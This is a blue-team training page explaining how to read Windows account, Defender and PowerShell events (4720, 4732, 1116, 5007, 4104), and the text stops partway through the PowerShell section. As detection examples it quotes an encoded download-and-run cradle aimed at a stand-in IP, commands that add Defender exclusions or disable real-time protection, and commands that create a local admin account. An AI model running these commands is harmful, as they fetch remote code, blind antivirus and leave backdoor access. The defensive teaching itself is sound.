---
title: "Account, Defender and PowerShell Events — 4720, 4728/4732/4756 Group Changes, Defender 1116/1117/1006, PowerShell 4103/4104"
tags:
  - training
  - blue-team
  - windows
  - logging
  - powershell
---

# Account, Defender and PowerShell Events — 4720, 4728/4732, 1116/1006, 4104 { #accounts-defender-powershell }

!!! abstract "What this page covers"
    Three groups of Windows events that answer three different questions. **Accounts:** "did someone create a new door key for themselves?" — why attackers create accounts and add them to admin groups, the two audit subcategories that record it, **4720** (user created) read field by field together with the burst of events that follows it, **4732 / 4728 / 4756** (member added to a local, global or universal group) with the common mistake about which ID you get for which group, the rest of the account life cycle (4722–4726, 4738, 4740, 4767, 4781, 4798/4799), and where each event is written. **Defender:** "what did the built-in antivirus see?" — the Defender Operational channel, **1116** (detected) and **1117** (action taken) read field by field, the older **1006/1007**, failures (1008, 1118, 1119), and the events that show someone switching protection off (5001, 5007, 5013) or attack surface reduction rules firing (1121/1122). **PowerShell:** "what exactly did the attacker type?" — module logging **4103**, script block logging **4104** read field by field (including how it shows an encoded command already decoded), split script blocks, automatic logging of suspicious blocks, transcription, the classic 400/800 events, the version 2 downgrade and PowerShell 7's separate log. SOC checklist, the 2026 view and practice questions.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, SIDs, IPs, file names and threat names are invented or generic examples for illustration (`.example`, documentation and private IPs).

## The 8 key points { #key-points }

1. A new account is a **spare key** an attacker leaves behind so they do not have to break in again (ATT&CK **T1136.001** local account, **T1136.002** domain account). Adding it — or an existing account — to an admin group is **T1098.007** (Additional Local or Domain Groups). A new account **in an admin group** also tells you the attacker already had admin rights.
2. **4720** "A user account was created" (subcategory *Audit User Account Management*) names **who created it** (Subject) and **the new account** (Target). It is followed within the same second by **4722** (enabled), **4724** (password set), **4738** (changed) — that burst is what `net user <name> <password> /add` looks like.
3. Group membership changes depend on the **group's scope**, not on "local vs domain": **4732** = security-enabled **local** group (including *domain local* groups and the built-in `Administrators` group on a domain controller), **4728** = **global** group (for example `Domain Admins`), **4756** = **universal** group (for example `Enterprise Admins`). Removals are 4733 / 4729 / 4757. All need *Audit Security Group Management*.
4. In 4732 for a local account, `MemberName` is just `-` — the member is only identified by **`MemberSid`**. Resolve the SID, or you will miss who was added. The group is identified by `TargetSid` (`S-1-5-32-544` = Administrators everywhere).
5. Domain account events are written on the **domain controller that processed the change**; local account events on **the machine itself**. Collect from every DC, not just one.
6. Defender writes to its own channel, **Microsoft-Windows-Windows Defender/Operational**, not to Security. **1116** = malware detected, **1117** = action taken; **1006/1007** are the older equivalents. Read **threat name, path, process name, detection user, action and result** — and treat a detection as the start of an investigation, not the end.
7. The events that matter most to a defender are often the ones about **Defender itself**: **5001** real-time protection disabled, **5007** configuration changed (watch for new **exclusions**), **5013** tamper protection blocked a change — all signs of **T1562.001** (Impair Defenses).
8. **4104** (script block logging, PowerShell Operational channel) records the **text of the code the PowerShell engine actually runs** — after encoding and many layers of obfuscation have been removed — but **not its output**. It is noisy, long scripts are split over several events (`MessageNumber`/`MessageTotal`, joined by `ScriptBlockId`), and blocks that look suspicious are logged at *Warning* level even when the policy is off. Output needs **transcription**; per-command details come from **4103** module logging.

## Why these three { #why }

Imagine a block of flats with a careful caretaker. A burglar who got in once through a broken window wants to come back without breaking it again, so he quietly has **a copy of the master key cut and his name added to the residents' list** — that is a new account in the admin group. The building also has a **smoke detector** in every flat that beeps and writes to a little diary whenever it smells something — that is the antivirus log. And finally, some flats have **a voice recorder that writes down every instruction spoken to the building's robot butler**, even if the instruction was mumbled in code — that is PowerShell script block logging. A good caretaker checks all three: the residents' list for names nobody recognises, the smoke-detector diaries for alarms (and for detectors that were switched off), and the butler's transcript for strange orders.

Back to the technical reality. After initial access, attackers want to **stay** (persistence, TA0003), **raise their rights** (TA0004) and **avoid being seen** (defence evasion, TA0005). Creating or changing accounts gives them durable, legitimate-looking access that survives a malware clean-up — the account is not malware, and antivirus will not remove it. Antivirus logs tell you what the attacker's tools tripped over and, just as importantly, whether the attacker tried to turn the antivirus off. PowerShell is installed on every Windows machine, can download and run code entirely in memory, and talks to every part of Windows, which makes it one of the most used attacker tools (T1059.001); the script block log is often the only place the actual attacker code is ever written down.

The attacker side is covered in [Execution, persistence and discovery](../endpoint-attacks/execution-persistence-discovery.md) and [Privilege escalation](../endpoint-attacks/privilege-escalation.md); antivirus as a defensive layer in [VBS, host firewalls and antivirus](../endpoint-defense/vbs-firewall-antivirus.md).

## Account creation and group changes { #accounts }

### Turning it on { #account-config }

Two subcategories of the advanced audit policy (category *Account Management*) produce these events:

```text
C:\> auditpol /get /subcategory:"User Account Management","Security Group Management"
System audit policy
Category/Subcategory                      Setting
Account Management
  User Account Management                 Success and Failure
  Security Group Management               Success
```

Line by line:

- `auditpol /get` — show the current audit policy (run as administrator).
- `/subcategory:"...","..."` — only these two subcategories, by name.
- `User Account Management   Success and Failure` — 4720, 4722–4726, 4738, 4740, 4767, 4781 and friends will be logged. *Failure* adds attempts that were refused (for example a non-admin trying to create a user).
- `Security Group Management   Success` — 4727–4737, 4754–4758, 4798/4799 will be logged.

Microsoft's defaults log *Success* for both on current Windows versions, and security baselines (Microsoft's own and CIS) require at least *Success*. But Group Policy in your environment may have changed it — always check with `auditpol` rather than assuming. Volume is low: these are the cheapest high-value events in the whole Security log.

### Event 4720: a user account was created { #4720 }

An attacker who already has admin rights on a file server runs `net user svc_backup2 <password> /add`. The Security log on that server gets this:

```xml
<System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
  <EventID>4720</EventID>
  <Task>13824</Task>
  <Keywords>0x8020000000000000</Keywords>
  <TimeCreated SystemTime="2026-11-20T03:41:07.5530912Z" />
  <Channel>Security</Channel>
  <Computer>FS-02.corp.example</Computer>
</System>
<EventData>
  <Data Name="TargetUserName">svc_backup2</Data>
  <Data Name="TargetDomainName">FS-02</Data>
  <Data Name="TargetSid">S-1-5-21-3021418877-1655470914-2519003118-1009</Data>
  <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-1120</Data>
  <Data Name="SubjectUserName">helpdesk.t2</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x3a91f02</Data>
  <Data Name="PrivilegeList">-</Data>
  <Data Name="SamAccountName">svc_backup2</Data>
  <Data Name="DisplayName">%%1793</Data>
  <Data Name="UserPrincipalName">-</Data>
  <Data Name="HomeDirectory">%%1793</Data>
  <Data Name="ScriptPath">%%1793</Data>
  <Data Name="PasswordLastSet">%%1794</Data>
  <Data Name="AccountExpires">%%1794</Data>
  <Data Name="PrimaryGroupId">513</Data>
  <Data Name="UserAccountControl">%%2080 %%2082 %%2084</Data>
  <Data Name="SidHistory">-</Data>
  <Data Name="LogonHours">%%1797</Data>
</EventData>
```

Field by field:

- `Provider` `Microsoft-Windows-Security-Auditing`, `Channel` `Security` — a normal Security audit event.
- `EventID` `4720` — "A user account was created." `Task` `13824` is the *User Account Management* subcategory.
- `Keywords` `0x8020000000000000` — "Audit Success". (Failure would be `0x8010000000000000`.)
- `Computer` `FS-02.corp.example` — where the event was written. For a **local** account this is the machine that now has the account.
- `TargetUserName` `svc_backup2` — **the new account**. The name imitates a service account to blend in — a classic choice, together with names like `support`, `admin1`, `defaultuser`, or a copy of a real employee's name with one letter changed.
- `TargetDomainName` `FS-02` — the computer name, not `CORP`: this is a **local** account on the server. (A domain account would show the domain's NetBIOS name and the event would be on a DC.)
- `TargetSid` `...-1009` — the new account's SID. The last part, the **RID**, increases with every account created on that machine; local RIDs start at 1000 (domain RIDs at 1000 or higher too). Remember this SID — it is how 4732 will refer to the account.
- `SubjectUserName` / `SubjectDomainName` `CORP\helpdesk.t2` — **who created it**. A help-desk account creating local users on a file server is unusual by itself.
- `SubjectLogonId` `0x3a91f02` — the logon session that did it. Search the same host for a 4624 with this `TargetLogonId` to learn **how** the creator logged on and from **where** (see [Login events](logins.md)), and for 4688 with this `SubjectLogonId` to see the `net.exe` command (see [Process creation events](process-creation.md)).
- `SamAccountName` — the pre-Windows-2000 logon name, usually identical to `TargetUserName`.
- `%%1793` = "&lt;value not set&gt;", `%%1794` = "&lt;never&gt;", `%%1797` = "All" (logon hours) — **message codes** that Event Viewer replaces with text (see [Windows event structure and channels](../windows-logging/event-structure-channels.md)). In raw XML or a SIEM you will see the codes.
- `PrimaryGroupId` `513` — "Domain Users"/"None", the normal default.
- `UserAccountControl` `%%2080 %%2082 %%2084` — flags set at creation: `%%2080` "Account Disabled", `%%2082` "'Password Not Required' - Enabled", `%%2084` "'Normal Account' - Enabled". Windows creates the account disabled and without a password for a moment, then the next events set a password and enable it — which is why 4720 alone looks odd and needs its companions.
- `SidHistory` `-` — empty. A **non-empty `SidHistory`** on a new or changed account is a big red flag: it can secretly give the account the rights of another SID, such as Domain Admins (T1134.005).

The burst that follows in the same second or two, all with the same `SubjectLogonId`:

| Event | Meaning | In this story |
| --- | --- | --- |
| 4722 | A user account was enabled | `svc_backup2` enabled |
| 4724 | An attempt was made to reset an account's password | The password from the command line is set (a **reset** by an admin; 4723 is a user **changing** their own) |
| 4738 | A user account was changed | Flags updated (`UserAccountControl` now without "Disabled" and "Password Not Required") |
| 4732 | A member was added to a security-enabled local group | Added to `Users` automatically — and later, the event you really care about: added to `Administrators` |

[Supplement] Domain accounts created in *Active Directory Users and Computers* or with `New-ADUser` produce the same events on the **domain controller** that handled the request, with `TargetDomainName` set to the domain. If *Audit Directory Service Changes* is on, the DC also writes **5137** (directory object created) with the object's full distinguished name.

### Event 4732: a member was added to a security-enabled local group { #4732 }

Minutes later the attacker runs `net localgroup Administrators svc_backup2 /add`:

```xml
<System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
  <EventID>4732</EventID>
  <Task>13826</Task>
  <TimeCreated SystemTime="2026-11-20T03:42:55.1029314Z" />
  <Channel>Security</Channel>
  <Computer>FS-02.corp.example</Computer>
</System>
<EventData>
  <Data Name="MemberName">-</Data>
  <Data Name="MemberSid">S-1-5-21-3021418877-1655470914-2519003118-1009</Data>
  <Data Name="TargetUserName">Administrators</Data>
  <Data Name="TargetDomainName">Builtin</Data>
  <Data Name="TargetSid">S-1-5-32-544</Data>
  <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-1120</Data>
  <Data Name="SubjectUserName">helpdesk.t2</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x3a91f02</Data>
  <Data Name="PrivilegeList">-</Data>
</EventData>
```

Field by field:

- `EventID` `4732` — "A member was added to a security-enabled local group." `Task` `13826` = *Security Group Management*.
- `MemberName` `-` — **empty**. This field holds the member's **distinguished name** (`CN=...,OU=...,DC=...`), which only exists for Active Directory objects. A **local** account has none, so you get a dash. Rules that look for the member's name in `MemberName` silently miss every local account.
- `MemberSid` `...-1009` — **this is the member**: the same SID as `TargetSid` in the 4720 above. Resolve it (Event Viewer often shows the name in the friendly view; in a SIEM, join with 4720 or look it up).
- `TargetUserName` `Administrators`, `TargetDomainName` `Builtin` — **the group**. Note the confusing naming: in group events, "Target" is the **group**, not the user.
- `TargetSid` `S-1-5-32-544` — the well-known SID of the built-in Administrators group, the same on every Windows machine. Match on the SID rather than the name: the name is translated on non-English systems ("Administratoren", "Administrateurs") and can be renamed.
- `Subject...` and `SubjectLogonId` `0x3a91f02` — the same person and the same logon session as the 4720. That link proves one actor did both.

Other well-known local group SIDs worth alerting on: `S-1-5-32-555` Remote Desktop Users (gives RDP access), `S-1-5-32-551` Backup Operators (can read any file, including registry hives with password hashes), `S-1-5-32-580` Remote Management Users (WinRM / PowerShell remoting).

### Which event ID for which group? { #group-scope }

[Correction] It is often said that "4732 is for local groups, 4728 is for domain groups". That is close but wrong in an important way. The ID depends on the group's **scope** in Active Directory terms:

| Group scope | Added / removed | Group created / changed / deleted | Typical examples |
| --- | --- | --- | --- |
| Local (on a member machine) and **domain local** (in AD) | **4732** / 4733 | 4731 / 4735 / 4734 | `Administrators`, `Remote Desktop Users`; on a DC: `BUILTIN\Administrators`, `Server Operators`, `Account Operators` |
| **Global** (in AD) | **4728** / 4729 | 4727 / 4737 / 4730 | `Domain Admins`, `Domain Users`, most departmental groups |
| **Universal** (in AD) | **4756** / 4757 | 4754 / 4755 / 4758 | `Enterprise Admins`, `Schema Admins` |

So: adding someone to **Domain Admins** on a DC → **4728**. Adding someone to the domain's **built-in Administrators** group (which is even more powerful on DCs) → **4732**, written on the DC. Adding someone to **Enterprise Admins** → **4756**. A rule that only watches 4728 misses two of the three most dangerous groups. (*Distribution* groups — mailing lists without security meaning — have their own IDs in the 4744–4762 range and usually do not matter.)

### The rest of the account life cycle { #account-lifecycle }

| Event | Meaning | Why you care |
| --- | --- | --- |
| 4722 / 4725 | Account enabled / disabled | Re-enabling a long-disabled account (an ex-employee, the built-in `Guest` or `Administrator`) is a quiet persistence trick |
| 4723 / 4724 | User changed own password / admin reset a password | A reset of a privileged account by an unusual subject is account takeover |
| 4726 | Account deleted | Attackers delete their account at the end to clean up — the 4720 is still there if you kept the logs |
| 4738 | Account changed | Look at what changed: `UserAccountControl` (for example "Password Never Expires", "Don't Require Preauth" — the latter enables AS-REP roasting), `SidHistory`, `AllowedToDelegateTo` |
| 4740 / 4767 | Account locked out / unlocked | Lock-outs spread across many accounts mean password spraying ([Login events](logins.md)) |
| 4781 | Account renamed | Renaming a created account to look legitimate, or renaming the built-in Administrator |
| 4798 / 4799 | A user's local group membership / a local group's membership was enumerated | Discovery (T1069.001, T1087.001): which accounts are admins? Noisy, because many legitimate tools do it — useful when the calling process is `net.exe`, PowerShell or something unknown |

### Triage in practice { #account-triage }

When an account or admin-group event fires, ask in this order:

1. **Who did it, and from where?** Subject → `SubjectLogonId` → the 4624 (logon type and source IP). An interactive logon of an IT admin from their own admin workstation during a change ticket is different from a network logon from a user's laptop at 3 a.m.
2. **What was it?** Name of the account, which group (by SID), and whether the account is new (a 4720 shortly before) or existing.
3. **How?** The process: `net.exe`/`net1.exe`, PowerShell `New-LocalUser`/`Add-LocalGroupMember`, an MMC console, or something odd (a web server process, an unknown binary).
4. **Was it used?** 4624 with the new account as `TargetUserName`, on this host and others.
5. **Is it elsewhere?** The same account name created on many hosts within minutes means a script or remote tool spreading.

A quick look on one host with PowerShell:

```powershell
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4720,4722,4724,4732,4728,4756; StartTime=(Get-Date).AddDays(-1) } |
  Select-Object TimeCreated, Id, @{n='Who';e={$_.Properties | Where-Object { $_ } | Select-Object -Index 5}}, Message |
  Format-List
```

Line by line:

- `Get-WinEvent -FilterHashtable @{ ... }` — read events, filtering inside the event log service (fast) instead of afterwards.
- `LogName='Security'` — the Security channel.
- `Id=4720,4722,...` — only these event IDs.
- `StartTime=(Get-Date).AddDays(-1)` — only the last 24 hours.
- `Select-Object TimeCreated, Id, ... Message` — keep the time, the ID and the rendered message; the `@{n=...;e=...}` part is a calculated column (here a rough attempt to pull one property out by position — positions differ by event ID, so in practice read the `Message` or parse `$_.ToXml()`).
- `Format-List` — one property per line, which is easier to read for long messages.

The output looks like this (shortened):

```text
TimeCreated : 20/11/2026 2:42:55 PM
Id          : 4732
Message     : A member was added to a security-enabled local group.
              Subject:  Account Name: helpdesk.t2  Account Domain: CORP  Logon ID: 0x3A91F02
              Member:   Security ID: FS-02\svc_backup2  Account Name: -
              Group:    Security ID: BUILTIN\Administrators  Group Name: Administrators

TimeCreated : 20/11/2026 2:41:07 PM
Id          : 4720
Message     : A user account was created.
              ...
```

Note the time is shown in the machine's local time (here UTC+11), while the XML `SystemTime` is UTC — keep that in mind when building a timeline.

## Microsoft Defender Antivirus events { #defender }

### Where the events are { #defender-channel }

Microsoft Defender Antivirus (still shown as "Windows Defender" in log and folder names) writes to its own channel:

- Event Viewer: *Applications and Services Logs → Microsoft → Windows → Windows Defender → Operational*
- Channel name: `Microsoft-Windows-Windows Defender/Operational`
- File: `C:\Windows\System32\winevt\Logs\Microsoft-Windows-Windows Defender%4Operational.evtx`

It is **not** in Security, so a SIEM agent configured for Security, System and Application will not see it — add the channel explicitly. Organisations with **Microsoft Defender for Endpoint** (formerly "Defender ATP") get detections centrally in the Defender portal anyway, but the local channel is still valuable: it works without that licence, it is on the disk for a forensic examiner, and it covers machines that were not onboarded.

### Event 1116: malware detected { #1116 }

A user opens a downloaded archive containing a credential-dumping tool. Defender's real-time protection catches it:

```xml
<System>
  <Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}" />
  <EventID>1116</EventID>
  <Level>3</Level>
  <TimeCreated SystemTime="2026-11-20T05:12:44.8812201Z" />
  <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
  <Computer>WS-031.corp.example</Computer>
  <Security UserID="S-1-5-18" />
</System>
<EventData>
  <Data Name="Product Name">Microsoft Defender Antivirus</Data>
  <Data Name="Detection ID">{6F1B2C2E-8A44-4C1D-9E7A-0B3C5D9E1A22}</Data>
  <Data Name="Detection Time">2026-11-20T05:12:44.851Z</Data>
  <Data Name="Threat ID">2147700001</Data>
  <Data Name="Threat Name">HackTool:Win64/Mimikatz</Data>
  <Data Name="Severity Name">High</Data>
  <Data Name="Category Name">Tool</Data>
  <Data Name="Process Name">C:\Windows\explorer.exe</Data>
  <Data Name="Detection User">CORP\j.lee</Data>
  <Data Name="Path">file:_C:\Users\j.lee\Downloads\tools\x64\mk.exe; containerfile:_C:\Users\j.lee\Downloads\tools.zip</Data>
  <Data Name="Origin Name">Internet</Data>
  <Data Name="Execution Name">Suspended</Data>
  <Data Name="Type Name">Concrete</Data>
  <Data Name="Source Name">Real-Time Protection</Data>
  <Data Name="Action Name">Not Applicable</Data>
  <Data Name="Security intelligence Version">AV: 1.441.112.0, AS: 1.441.112.0</Data>
  <Data Name="Engine Version">AM: 1.1.25100.2</Data>
</EventData>
```

Field by field:

- `Provider` `Microsoft-Windows-Windows Defender` and the Operational channel — Defender wrote this, not the Security auditing system.
- `EventID` `1116` — "The antimalware platform detected malware or other potentially unwanted software." It means **found**, not yet **dealt with**.
- `Level` `3` — Warning.
- `Security UserID` `S-1-5-18` — LocalSystem: the Defender service writes the event. The user involved is in `Detection User` below.
- `Detection ID` — a GUID shared with the matching 1117 (action) event. Use it to join "detected" with "what happened next".
- `Threat Name` `HackTool:Win64/Mimikatz` — Microsoft's naming is `Type:Platform/Family.Variant!Suffix`. The **type** is the most useful first read: `Trojan`, `Backdoor`, `Ransom`, `Exploit` are malware; `HackTool` is an attacker or admin **tool** — and a hack tool on a normal user's laptop is often **worse news** than commodity adware, because it suggests a human attacker is working on the machine (see [Credential dumping and Mimikatz](../endpoint-attacks/credential-dumping-mimikatz.md)). `PUA`/`PUADlMgr`/`SoftwareBundler` are unwanted software; `Behavior:` comes from behaviour monitoring; `!ml`/`!MTB` suffixes mean machine-learning or cloud detections with less certainty about the family.
- `Severity Name` `High`, `Category Name` `Tool` — Microsoft's own rating. Useful for prioritising, but do not drop *Low* and *Moderate* on the floor — attacker tools are sometimes rated low.
- `Process Name` `C:\Windows\explorer.exe` — the process that touched the file when it was detected. `explorer.exe` = the user opened or extracted it; `chrome.exe`/`msedge.exe` = at download; `powershell.exe` or `cmd.exe` = something ran it from a command line — the last case is more serious.
- `Detection User` `CORP\j.lee` — whose session it was. Not necessarily who is guilty — malware runs as the user it infects.
- `Path` — `file:_` followed by the file path; `containerfile:_` shows the archive it came from. Multiple paths are separated by `;`. Other prefixes you will see: `process:_pid:...` (a running process), `regkey:_` (a registry value), `webfile:_` (a download, with the URL).
- `Origin Name` `Internet` — where Defender thinks the file came from (Mark of the Web). Others: `Local machine`, `Network share`, `Unknown`.
- `Execution Name` `Suspended` — whether the threat was running: `Suspended` (stopped before running), `Executing` (it **was running** — assume it did something), `Not Executing`.
- `Source Name` `Real-Time Protection` — which feature found it: real-time protection, a scheduled scan, a user scan, behaviour monitoring, AMSI (script content).
- `Action Name` `Not Applicable` — no action **yet** at detection time; the outcome is in 1117.
- `Security intelligence Version`, `Engine Version` — signature and engine versions. Very old versions mean the machine has not updated — itself a finding.

### Event 1117 and the rest of the family { #defender-family }

Within a second you normally see **1117** "The antimalware platform performed an action to protect your system from malware or other potentially unwanted software", with the same `Detection ID`, plus `Action Name` (`Quarantine`, `Remove`, `Block`, `Allow`) and `Error Code` / `Error Description` (`0x00000000` "The operation completed successfully"). The important event IDs:

| Event | Meaning | Why you care |
| --- | --- | --- |
| **1116** | Malware or unwanted software detected | Start of the story — real-time, behaviour or AMSI detection |
| **1117** | Action taken (quarantine, remove, block, allow) | Did the clean-up work? `Allow` means someone allowed it |
| **1006** / **1007** | Malware detected / action taken (older events, mostly from scans) | Same meaning as 1116/1117; still seen, collect both pairs |
| 1008, 1118, 1119 | Action **failed** (1118 non-critical, 1119 critical) | The malware may still be there — escalate |
| 1015 | Suspicious behaviour detected | Behaviour monitoring, no file signature needed |
| 1121 / 1122 | Attack surface reduction (ASR) rule **blocked** / **audited** an action | For example Office creating child processes, credential theft from LSASS — high-value signal |
| 1123 / 1124 | Controlled folder access blocked / audited | A process tried to change protected folders — ransomware behaviour |
| 1125 / 1126 | Network protection audited / blocked a connection | Connection to a known bad host |
| 2001 / 2003 | Security intelligence / engine update failed | Machine falling behind |
| **5001** | **Real-time protection disabled** | Someone turned off protection (T1562.001) |
| **5007** | **Configuration changed** (old and new value in the event) | Watch for new **exclusions** (`...\Exclusions\Paths\C:\Users\Public`) — attackers exclude their folder before dropping tools |
| 5010 / 5012 | Scanning for malware / viruses disabled | Same as 5001 |
| **5013** | **Tamper protection blocked a change** | An attempt to switch Defender off was stopped — someone tried |

[Supplement] The attacker's usual first move against Defender is not to fight it but to tell it to look away: `Set-MpPreference -ExclusionPath C:\Users\Public` or `-DisableRealtimeMonitoring $true`, or the same through the registry. That leaves **5007** (or **5001**), a **4688** of `powershell.exe` with `Set-MpPreference` on the command line, and a **4104** with the same text. If tamper protection is on, you instead get **5013** — and the attacker has announced themselves. A 5007 that adds an exclusion outside a change window should be investigated like a malware detection.

On a single machine, `Get-MpThreatDetection` lists past detections without opening Event Viewer:

```powershell
Get-MpThreatDetection | Select-Object InitialDetectionTime, ThreatID, ProcessName, DomainUser, ActionSuccess, Resources
```

```text
InitialDetectionTime : 20/11/2026 4:12:44 PM
ThreatID             : 2147700001
ProcessName          : C:\Windows\explorer.exe
DomainUser           : CORP\j.lee
ActionSuccess        : True
Resources            : {file:_C:\Users\j.lee\Downloads\tools\x64\mk.exe, containerfile:_C:\Users\j.lee\Downloads\tools.zip}
```

`Get-MpThreat` turns the `ThreatID` into the threat name; `ActionSuccess : True` matches a successful 1117.

### Reading a detection like an analyst { #defender-triage }

A detection where the action succeeded is **not** a closed case. Ask:

- **How did it get there?** `Origin`, the container file, browser history, email logs. If a tool was downloaded, someone chose to download it.
- **Did it run?** `Execution Name` `Executing`, or 4688/Sysmon process events for the file before the detection, mean it had time to act.
- **What else is on the machine?** Antivirus catches the files it knows. A hack tool detection usually means there are other, unknown tools and an attacker session — check logons (4624 type 10/3), new services and tasks ([Service, scheduled task and USB events](services-tasks-usb.md)) and accounts (above).
- **Is the same thing elsewhere?** Search the threat name and the file name across all hosts.
- **Did anyone try to switch Defender off?** 5001, 5007, 5013 on the same host around the same time.

## PowerShell logging { #powershell }

### Why PowerShell needs its own logs { #ps-why }

PowerShell is a full programming language built into Windows. An attacker can download a script from the internet and run it **in memory** without ever writing a file (`IEX (New-Object Net.WebClient).DownloadString(...)`), hide the command in Base64 (`-EncodedCommand`), and build it from fragments at run time to defeat simple string searches (T1027.010, Command Obfuscation). Process creation logs (4688, Sysmon 1) show only **the command line that started `powershell.exe`** — if the attacker types commands into an interactive prompt, or the command line just says `-enc SQBFAFgA...`, the process log tells you almost nothing about what actually happened. PowerShell's own logs fill that gap.

There are several kinds; it helps to see them side by side:

| Log | Event / location | What it records | Enable with |
| --- | --- | --- | --- |
| Script block logging | **4104**, `Microsoft-Windows-PowerShell/Operational` | The text of every script block the engine compiles — de-obfuscated at that layer | GPO *Turn on PowerShell Script Block Logging* |
| Module logging | **4103**, same channel | Each command invocation with its parameters (pipeline execution details) | GPO *Turn on Module Logging* + module names (`*`) |
| Transcription | Text files in a chosen folder | Everything typed **and its output**, like a screen recording in text | GPO *Turn on PowerShell Transcription* |
| Classic engine events | 400/403 (engine start/stop), 600 (provider), 800 (pipeline), `Windows PowerShell` log | Engine start with the **host version** and the host application command line | On by default |

### Turning script block logging on { #ps-config }

The GPO is under *Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell*. It sets this registry value, which you can check on any machine:

```text
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
    EnableScriptBlockLogging    REG_DWORD    0x1
```

- `reg query <key>` — show the values under the policy key.
- `EnableScriptBlockLogging  REG_DWORD  0x1` — script block logging is on. Missing key or `0x0` = only automatic logging of suspicious blocks (see below).
- There is also `EnableScriptBlockInvocationLogging` (events 4105/4106, start/stop of each block). Leave it **off** — it multiplies volume and adds little.

### Event 4104: creating a script block { #4104 }

A phishing document starts this process (seen in 4688):

```text
powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGEALgBwAHMAMQAnACkA
```

The process log shows only Base64. The PowerShell Operational log on the same machine shows:

```xml
<System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
  <EventID>4104</EventID>
  <Level>3</Level>
  <Task>2</Task>
  <Opcode>15</Opcode>
  <TimeCreated SystemTime="2026-11-20T05:30:02.3127755Z" />
  <Execution ProcessID="7412" ThreadID="5528" />
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
  <Computer>WS-031.corp.example</Computer>
  <Security UserID="S-1-5-21-1004336348-1177238915-682003330-1187" />
</System>
<EventData>
  <Data Name="MessageNumber">1</Data>
  <Data Name="MessageTotal">1</Data>
  <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')</Data>
  <Data Name="ScriptBlockId">9c2f7b1e-41d3-4a70-8f5e-2b7d6a0c3e91</Data>
  <Data Name="Path"></Data>
</EventData>
```

Field by field:

- `Provider` `Microsoft-Windows-PowerShell`, `Channel` `Microsoft-Windows-PowerShell/Operational` — Windows PowerShell 5.1's own log. **Not** the Security channel: collect it explicitly.
- `EventID` `4104` — "Creating Scriptblock text." `Task` `2` / `Opcode` `15` = "Execute a Remote Command / On create calls" in the friendly view — the wording is odd; it just means a script block was compiled.
- `Level` `3` — **Warning**. PowerShell gave it Warning because the text contains words it considers suspicious (here `DownloadString` and `IEX`-style invocation). Normal blocks are `Level` `5` (Verbose). This is a free, if crude, first filter.
- `Execution ProcessID="7412"` — the PID of the `powershell.exe` process. Join with 4688 / Sysmon 1 to get the parent (here `WINWORD.EXE`) and the full command line.
- `Security UserID` — the SID of the user running PowerShell (`...-1187`, here `CORP\j.lee`).
- `MessageNumber` / `MessageTotal` `1` / `1` — this block fitted in one event. Long scripts are split into pieces (a single event holds roughly 32 KB of text); you get for example `1 of 6` ... `6 of 6`, and you must put them back together.
- `ScriptBlockText` — **the gold**. The Base64 from the command line is gone: the engine decoded it before compiling, so the log shows the real code — download text from `http://198.51.100.23/a.ps1` and run it with `IEX` (`Invoke-Expression`). The downloaded `a.ps1` is itself compiled into script blocks, so **the next 4104 events will contain the downloaded script's code** too, even though it never touched the disk.
- `ScriptBlockId` — a GUID that is the same for all pieces of one block. Group by it to reassemble split scripts.
- `Path` — empty for code typed or passed on the command line; the script file path when a `.ps1` file runs (for example `C:\Users\j.lee\AppData\Local\Temp\u.ps1`).

[Supplement] Why obfuscation does not survive: every time obfuscated code calls `Invoke-Expression`, `[ScriptBlock]::Create()` or similar on a string it has built, the engine must compile that string — and compiling is what 4104 records. So for an attacker who wraps code in five layers of encoding, you see five 4104s, each one layer cleaner, the last one in plain text. You can decode the Base64 yourself to confirm:

```powershell
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBi...'))
```

- `[Convert]::FromBase64String('...')` — turn the Base64 text back into bytes.
- `[Text.Encoding]::Unicode.GetString(...)` — interpret those bytes as **UTF-16LE** ("Unicode" in .NET), which is what `-EncodedCommand` always uses. With UTF-8 you would get letters separated by empty characters — the `AAA` pattern in the Base64 is the giveaway of UTF-16LE.

Output: `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')`. Do this only in an analysis environment and never run the result.

Reassembling a split script on one host:

```powershell
Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104 } |
  Where-Object { $_.Properties[3].Value -eq '9c2f7b1e-41d3-4a70-8f5e-2b7d6a0c3e91' } |
  Sort-Object { $_.Properties[0].Value } |
  ForEach-Object { $_.Properties[2].Value } | Out-File C:\IR\block.txt
```

- `Get-WinEvent -FilterHashtable @{...Id=4104}` — all 4104 events from the PowerShell Operational channel.
